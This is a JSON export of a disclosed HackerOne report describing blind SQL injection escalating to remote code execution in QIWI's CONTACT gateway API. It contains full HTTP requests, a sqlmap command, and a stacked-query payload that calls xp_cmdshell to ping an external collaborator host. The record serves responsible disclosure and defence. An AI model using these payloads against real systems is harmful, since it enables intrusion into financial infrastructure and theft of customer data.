{"id":816254,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MTYyNTQ=","url":"https://hackerone.com/reports/816254","title":"SQL injection on contactws.contact-sys.com in TScenObject action ScenObjects leads to remote code execution","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-03-10T19:57:50.225Z","submitted_at":"2020-03-10T19:57:50.225Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"honoki","url":"/honoki","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/PECr85tFyrx5rcLTm839XWDR/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":215,"url":"https://hackerone.com/qiwi","handle":"qiwi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"QIWI","twitter_handle":"QiwiRussia","website":"https://qiwi.com","about":"The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank and even terminals of goods delivery."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-19T06:03:15.587Z","bug_reporter_agreed_on_going_public_at":"2020-05-20T06:03:03.338Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\n\nThe API interface on https://contactws.contact-sys.com:3456/ accepts a `\u003cREQUEST/\u003e` body to interact with the server's AppServ object. Because of insufficient input validation, an attacker can abuse the `SCEN_ID` parameter to inject arbitrary SQL statements into the `WHERE` clause of the underlying SQL statement. This leads to a blind SQL injection vulnerability, which in turn leads to Remote Code Execution on the server.\n\n## Technical details\n\nTo find this vulnerability, I made use of a working `INT_SOFT_ID` that I found in online documentation, and the documentation for the `TScenObject` class on https://www.contact-sys.com/files/redactor/files/04_CONTACT%20Gateway_28.11.2017-2.pdf\n\nIt also leverages the fact that requests with the flag `ExpectSigned=\"No\"` set do not require a valid signature.\n\nThe query appears to be something like:\n\n```sql\nSELECT *  FROM tblName WHERE id=\u003cinject\u003e order by STEP;\n```\n\nThe RCE can be triggered by chaining multiple queries as one:\n````sql\n33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'\n``\n\n## Steps to reproduce\n\nTo confirm the SQL injection, run `sqlmap -r sqlitest.txt --batch --current-db --force-ssl` with the following `input.txt`:\n\n```http\nPOST / HTTP/1.1\nHost: contactws.contact-sys.com:3456\nContent-Type: application/xml\nContent-Length: 185\n\n\u003cREQUEST OBJECT_CLASS=\"TScenObject\" ACTION=\"ScenObjects\" SCEN_ID=\"33*\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"\u003e\u003c/REQUEST\u003e\n```\n\n{F743576}\n\nTo reproduce the RCE, execute the following request (replace with your own burp collaborator):\n\n```http\nPOST / HTTP/1.1\nHost: contactws.contact-sys.com:3456\nContent-Type: application/xml\nContent-Length: 342\n\n\u003cREQUEST OBJECT_CLASS=\"TScenObject\" ACTION=\"ScenObjects\" SCEN_ID=\"33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"\u003e\u003c/REQUEST\u003e\n```\nand monitor your DNS logs for the incoming ping request:\n\n{F743577}\n\n## Recommendation\n\nSQL injection vulnerabilities can be remedied by escaping the user-supplied input instead of using it to construct a query.\n\n## Impact\n\nBy executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer's financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\n\u003cp\u003eThe API interface on \u003ca title=\"https://contactws.contact-sys.com:3456/\" href=\"/redirect?url=https%3A%2F%2Fcontactws.contact-sys.com%3A3456%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://contactws.contact-sys.com:3456/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e accepts a \u003ccode\u003e\u0026lt;REQUEST/\u0026gt;\u003c/code\u003e body to interact with the server\u0026#39;s AppServ object. Because of insufficient input validation, an attacker can abuse the \u003ccode\u003eSCEN_ID\u003c/code\u003e parameter to inject arbitrary SQL statements into the \u003ccode\u003eWHERE\u003c/code\u003e clause of the underlying SQL statement. This leads to a blind SQL injection vulnerability, which in turn leads to Remote Code Execution on the server.\u003c/p\u003e\n\n\u003ch2 id=\"technical-details\"\u003eTechnical details\u003c/h2\u003e\n\n\u003cp\u003eTo find this vulnerability, I made use of a working \u003ccode\u003eINT_SOFT_ID\u003c/code\u003e that I found in online documentation, and the documentation for the \u003ccode\u003eTScenObject\u003c/code\u003e class on \u003ca title=\"https://www.contact-sys.com/files/redactor/files/04_CONTACT%20Gateway_28.11.2017-2.pdf\" href=\"/redirect?url=https%3A%2F%2Fwww.contact-sys.com%2Ffiles%2Fredactor%2Ffiles%2F04_CONTACT%2520Gateway_28.11.2017-2.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.contact-sys.com/files/redactor/files/04_CONTACT%20Gateway_28.11.2017-2.pdf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIt also leverages the fact that requests with the flag \u003ccode\u003eExpectSigned=\u0026quot;No\u0026quot;\u003c/code\u003e set do not require a valid signature.\u003c/p\u003e\n\n\u003cp\u003eThe query appears to be something like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight sql\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e  \u003cspan class=\"k\"\u003eFROM\u003c/span\u003e \u003cspan class=\"n\"\u003etblName\u003c/span\u003e \u003cspan class=\"k\"\u003eWHERE\u003c/span\u003e \u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003einject\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003eorder\u003c/span\u003e \u003cspan class=\"k\"\u003eby\u003c/span\u003e \u003cspan class=\"n\"\u003eSTEP\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe RCE can be triggered by chaining multiple queries as one:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight sql\"\u003e\u003ccode\u003e\u003cspan class=\"mi\"\u003e33\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003eDECLARE\u003c/span\u003e \u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003ecommand\u003c/span\u003e \u003cspan class=\"nb\"\u003evarchar\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e255\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003ecommand\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003eEXEC\u003c/span\u003e \u003cspan class=\"n\"\u003eMaster\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edbo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003exp_cmdshell\u003c/span\u003e \u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;STEP\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e``\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e##\u003c/span\u003e \u003cspan class=\"n\"\u003eSteps\u003c/span\u003e \u003cspan class=\"k\"\u003eto\u003c/span\u003e \u003cspan class=\"n\"\u003ereproduce\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eTo\u003c/span\u003e \u003cspan class=\"n\"\u003econfirm\u003c/span\u003e \u003cspan class=\"n\"\u003ethe\u003c/span\u003e \u003cspan class=\"k\"\u003eSQL\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erun\u003c/span\u003e \u003cspan class=\"nv\"\u003e`sqlmap -r sqlitest.txt --batch --current-db --force-ssl`\u003c/span\u003e \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"n\"\u003ethe\u003c/span\u003e \u003cspan class=\"n\"\u003efollowing\u003c/span\u003e \u003cspan class=\"nv\"\u003e`input.txt`\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e`\u003c/span\u003e\u003cspan class=\"se\"\u003e``\u003c/span\u003e\u003cspan class=\"nv\"\u003ehttp\nPOST / HTTP/1.1\nHost: contactws.contact-sys.com:3456\nContent-Type: application/xml\nContent-Length: 185\n\n\u0026lt;REQUEST OBJECT_CLASS=\u0026quot;TScenObject\u0026quot; ACTION=\u0026quot;ScenObjects\u0026quot; SCEN_ID=\u0026quot;33*\u0026quot; ExpectSigned=\u0026quot;No\u0026quot; INT_SOFT_ID=\u0026quot;DA61D1CE-757F-44C3-B3F7-11A026C37CD4\u0026quot; POINT_CODE=\u0026quot;tzhr\u0026quot; lang=\u0026quot;en\u0026quot;\u0026gt;\u0026lt;/REQUEST\u0026gt;\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2020-03-10-sql-injection-sqlmap.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jG27qsK2yhPbKT4EWVWEAXZ9?response-content-disposition=attachment%3B%20filename%3D%222020-03-10-sql-injection-sqlmap.png%22%3B%20filename%2A%3DUTF-8%27%272020-03-10-sql-injection-sqlmap.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065736Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026amp;X-Amz-Signature=deb1a69433212e056a43f9309d5a67dbc03542fd34f2f05032e8125b51742bba\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jG27qsK2yhPbKT4EWVWEAXZ9?response-content-disposition=attachment%3B%20filename%3D%222020-03-10-sql-injection-sqlmap.png%22%3B%20filename%2A%3DUTF-8%27%272020-03-10-sql-injection-sqlmap.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065736Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026amp;X-Amz-Signature=deb1a69433212e056a43f9309d5a67dbc03542fd34f2f05032e8125b51742bba\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eTo reproduce the RCE, execute the following request (replace with your own burp collaborator):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003econtactws.contact-sys.com:3456\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/xml\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e342\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;REQUEST\u003c/span\u003e \u003cspan class=\"na\"\u003eOBJECT_CLASS=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TScenObject\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eACTION=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;ScenObjects\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eSCEN_ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;33; DECLARE @command varchar(255); SELECT @command=\u0026#39;ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net\u0026#39;; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as \u0026#39;STEP\u0026#39;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eExpectSigned=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;No\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eINT_SOFT_ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;DA61D1CE-757F-44C3-B3F7-11A026C37CD4\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ePOINT_CODE=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;tzhr\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003elang=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;en\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/REQUEST\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand monitor your DNS logs for the incoming ping request:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2020-03-10-sql-injection-to-rce.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vcmwzX9UBwB48mE1mxVLGTry?response-content-disposition=attachment%3B%20filename%3D%222020-03-10-sql-injection-to-rce.png%22%3B%20filename%2A%3DUTF-8%27%272020-03-10-sql-injection-to-rce.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065736Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026amp;X-Amz-Signature=6792444301e77936289b9062bd6b7203e2ea80959f0e39ac59d877e34e4f7786\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vcmwzX9UBwB48mE1mxVLGTry?response-content-disposition=attachment%3B%20filename%3D%222020-03-10-sql-injection-to-rce.png%22%3B%20filename%2A%3DUTF-8%27%272020-03-10-sql-injection-to-rce.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065736Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026amp;X-Amz-Signature=6792444301e77936289b9062bd6b7203e2ea80959f0e39ac59d877e34e4f7786\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"recommendation\"\u003eRecommendation\u003c/h2\u003e\n\n\u003cp\u003eSQL injection vulnerabilities can be remedied by escaping the user-supplied input instead of using it to construct a query.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eBy executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer\u0026#39;s financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.\u003c/p\u003e\n","bounty_amount":"5500.0","formatted_bounty":"$5,500","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":743576,"file_name":"2020-03-10-sql-injection-sqlmap.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jG27qsK2yhPbKT4EWVWEAXZ9?response-content-disposition=attachment%3B%20filename%3D%222020-03-10-sql-injection-sqlmap.png%22%3B%20filename%2A%3DUTF-8%27%272020-03-10-sql-injection-sqlmap.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065736Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRu